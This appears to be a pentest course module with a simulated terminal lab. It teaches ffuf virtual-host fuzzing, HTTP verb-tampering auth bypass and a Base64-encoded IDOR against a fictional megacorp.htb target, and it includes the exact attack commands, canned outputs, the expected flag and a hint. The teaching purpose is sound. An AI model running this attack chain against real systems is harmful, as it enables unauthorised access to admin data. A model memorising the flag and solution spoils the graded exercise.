---
id: mod-pt-301
track_id: track-pentest
slug: web-recon-ffuf-fuzzing-idor-auth-bypass
title: '301: Web Reconnaissance, Ffuf VHost Fuzzing & Auth Bypass (IDOR)'
difficulty: Intermediate
order_index: 9
estimated_minutes: 35
lab_type: terminal
lab_briefing: Target 10.10.14.50 serves a default 4218-byte marketing page for megacorp.htb. (1) Run ffuf with -fs 4218 to discover the unlinked virtual host, (2) bypass the POST/GET authentication filter on /api/v1/audit using HTTP Verb Tampering (-X OPTIONS), and (3) exploit the Base64-encoded IDOR parameter (uid=YWRtaW5fMDAx) to extract the administrator flag.
expected_flag: FLAG{FFUF_VHOST_VERB_TAMPER_IDOR}
hint: Execute the 4 steps in sequence, ending with the Base64-encoded IDOR request (uid=YWRtaW5fMDAx) on staging-portal.megacorp.htb.
lab_config:
  target_ip: 10.10.14.50
  quick_commands:
    - 'ffuf -w /usr/share/seclists/Discovery/DNS/subdomains.txt -u http://10.10.14.50/ -H "Host: FUZZ.megacorp.htb" -fs 4218'
    - 'curl -s -X GET -H "Host: staging-portal.megacorp.htb" http://10.10.14.50/api/v1/audit'
    - 'curl -s -X OPTIONS -H "Host: staging-portal.megacorp.htb" http://10.10.14.50/api/v1/audit'
    - 'curl -s -H "Host: staging-portal.megacorp.htb" "http://10.10.14.50/api/v1/profile?uid=YWRtaW5fMDAx"'
  commands:
    'ffuf -w /usr/share/seclists/Discovery/DNS/subdomains.txt -u http://10.10.14.50/ -H "Host: FUZZ.megacorp.htb" -fs 4218': |2-
              /'___\  /'___\           /'___\
             /\ \__/ /\ \__/  __  __  /\ \__/
             \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
              \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
               \ \_\   \ \_\  \ \____/  \ \_\
                \/_/    \/_/   \/___/    \/_/

       :: Method           : GET
       :: URL              : http://10.10.14.50/
       :: Header           : Host: FUZZ.megacorp.htb
       :: Matcher          : Response status: 200,204,301,302,307,401,403
       :: Filter           : Response size: 4218
      ________________________________________________

      staging-portal          [Status: 200, Size: 1894, Words: 215, Lines: 44]
    'curl -s -X GET -H "Host: staging-portal.megacorp.htb" http://10.10.14.50/api/v1/audit': '{"error":"403 Forbidden: GET and POST methods require Admin JWT Session"}'
    'curl -s -X OPTIONS -H "Host: staging-portal.megacorp.htb" http://10.10.14.50/api/v1/audit': '{"status":"verb_tamper_bypass_success","allowed_methods":["GET","POST","OPTIONS"],"leaked_endpoint":"/api/v1/profile?uid=<base64_user_id>","admin_id_hint":"admin_001 -> YWRtaW5fMDAx"}'
    'curl -s -H "Host: staging-portal.megacorp.htb" "http://10.10.14.50/api/v1/profile?uid=YWRtaW5fMDAx"': |-
      {
        "uid_decoded": "admin_001",
        "role": "Enterprise_SuperAdmin",
        "ssh_deploy_flag": "FLAG{FFUF_VHOST_VERB_TAMPER_IDOR}"
      }
---

# 301: Web Reconnaissance, Ffuf VHost Fuzzing & Auth Bypass (IDOR)

## Sub-Unit 7.1 & 7.2: High-Speed Web & Virtual Host Fuzzing with Ffuf

A single IP address often hosts multiple web applications using HTTP `Host:` header routing (**Virtual Hosts**). If a staging portal (`staging-admin.megacorp.htb`) is not registered in public DNS, standard subdomain scanners will miss it—unless you fuzz the `Host:` header directly against the web server IP using `ffuf` and filter out the default response size (`-fs`):

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.14.50/ -H "Host: FUZZ.megacorp.htb" -fs 4218
```

Key `ffuf` response filters:
- `-fs <bytes>`: Filter out responses matching the default catch-all byte size.
- `-fw <words>` / `-fl <lines>`: Filter by word count or line count.
- `-mc 200,301,302,403`: Match specific HTTP status codes.

## Sub-Unit 7.3: HTTP Verb Tampering & Insecure Direct Object References (IDOR)

Once hidden endpoints are discovered, test authentication and authorization controls systematically:
1. **HTTP Verb Tampering**: Misconfigured web frameworks (`.htaccess`, Spring Security, or custom middleware) sometimes restrict `GET` and `POST` requests on `/admin/export` to authenticated admins while inadvertently allowing `HEAD`, `OPTIONS`, or `PUT` requests to bypass the auth check entirely.
2. **Insecure Direct Object References (IDOR / BOLA)**: When an application references user objects via predictable numeric IDs (`?user_id=1001`), UUIDs leaked in public APIs, or Base64/MD5-encoded identifiers (`uid=YWRtaW5fMDAx` -> `admin_001`) without verifying server-side session ownership, an attacker can iterate or decode the parameter to exfiltrate privileged records.
